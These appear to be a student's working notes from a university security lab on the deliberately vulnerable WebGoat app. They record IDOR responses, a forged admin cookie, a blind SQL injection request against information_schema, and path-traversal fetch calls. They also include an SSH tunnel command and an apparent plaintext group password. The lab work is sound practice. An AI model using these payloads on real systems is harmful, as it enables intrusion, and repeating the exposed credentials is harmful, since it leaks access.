


```
ssh -i /home/armadillo/.ssh/activas/Grupo_3_id_rsa -L 8080:10.0.3.5:80 -L 9090:10.0.3.5:9090 -J matias.montano@lulu.fing.edu.uy fsi03@192.168.44.13
```



grupo-03-facundo-matias

37U6;?~x=b



----


# leccion 
http://localhost:8080/WebGoat/start.mvc#lesson/IDOR.lesson/3

WebGoat/IDOR/profile/2342384


{
  "lessonCompleted" : true,
  "feedback" : "Well done, you found someone else's profile",
  "output" : "{role=3, color=brown, size=large, name=Buffalo Bill, userId=2342388}",
  "assignment" : "IDORViewOtherProfile",
  "attemptWasMade" : true
}

{
  "role": 1,
  "color": "red",
  "size": "large",
  "name": "Buffalo Bill",
  "userId": "2342388"
}
----

leccion 2
[ {
  "username" : "Tom",
  "admin" : false,
  "userHash" : "Mydnhcy00j2b0m6SjmPz6PUxF9WIeO7tzm665GiZWCo="
}, {
  "username" : "Jerry",
  "admin" : true,
  "userHash" : "SVtOlaa+ER+w2eoIIVE5/77umvhcsh5V8UyDLUa1Itg="
}, {
  "username" : "Sylvester",
  "admin" : false,
  "userHash" : "B5zhk70ZfZluvQ4smRl4nqCvdOTggMZtKS3TtTqIed0="
} ]


[ {
  "username" : "Tom",
  "admin" : false,
  "userHash" : "RIbP+ltDVkKRPGe5qYGkVCjj/BtjNcryiYhlT+ejD/s="
}, {
  "username" : "Jerry",
  "admin" : true,
  "userHash" : "d4T2ahJN4fWP83s9JdLISio7Auh4mWhFT1Q38S6OewM="
}, {
  "username" : "Sylvester",
  "admin" : false,
  "userHash" : "iBy1RDvLrUMMpMJHjQsLm/5FLN07NnBtdlOFc845j+A="
}, {
  "username" : "grupo-03-facundo-matias",
  "admin" : true,
  "userHash" : "2IeMLciX0meRE0d7YmJar8SDCr/sSh8RNjPu3kO+Hyc="
} ]


-----

Set-Cookie
	spoof_auth="NWE2OTY0NjY3NzZkNGQ0ODUxNjY 3NDYxNmY2NzYyNjU3Nw=="; Version=1; Path=/WebGoat; Discard; Secure

de webgoat


coookie de admin
Set-Cookie
	spoof_auth=NWE2OTY0NjY3NzZkNGQ0ODUxNjY 2ZTY5NmQ2NDYx; path=/WebGoat; secure




    PUT http://localhost:8080/WebGoat/SqlInjectionAdvanced/challenge HTTP/1.1
host: localhost:8080
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:152.0) Gecko/20100101 Firefox/152.0
Accept: */*
Accept-Language: en-US,en;q=0.9
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 60
Origin: http://localhost:8080
Connection: keep-alive
Referer: http://localhost:8080/WebGoat/start.mvc
Cookie: JSESSIONID=eBFKpHrRy6W3hTPD3g7Dq0_RCtDUUnlC6epWvLKL; spoof_auth=NDE0MTQxNDE0MTQxNDE0MTQxNDE2ZDZmNzQ=; WEBWOLFSESSION=HtahL76ZEmS8FVtgQl-Ck1ShhwcEz6kBZkTXBgZw
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0

username_reg=tom' OR (SELECT SUBSTRING(table_name, 12, 1) FROM information_schema.tables WHERE table_name LIKE 'access_log%' LIMIT 1) = 'a'--&email_reg=cas@sd.com&password_reg=1234&confirm_password_reg=1234


username_reg=tom' OR (SELECT SUBSTRING(table_name, 12, 1) FROM information_schema.tables WHERE table_name LIKE 'access_log%' LIMIT 1) = 'a'--





fetch('http://localhost:8080/WebGoat/PathTraversal/profile-upload', {
  method: 'POST',
  body: (() => {
    const fd = new FormData();
    fd.append('uploadedFile', new Blob(['a'], {type: 'text/plain'}), 'test.txt');
    fd.append('fullName', '../test');
    fd.append('email', 'test@test.com');
    fd.append('password', 'test');
    return fd;
  })()
}).then(r => r.json()).then(console.log)




fetch('http://localhost:8080/WebGoat/PathTraversal/random-picture?id=%2e%2e%2f%2e%2e%2f')
.then(r => r.text())
.then(data => console.log(data)) 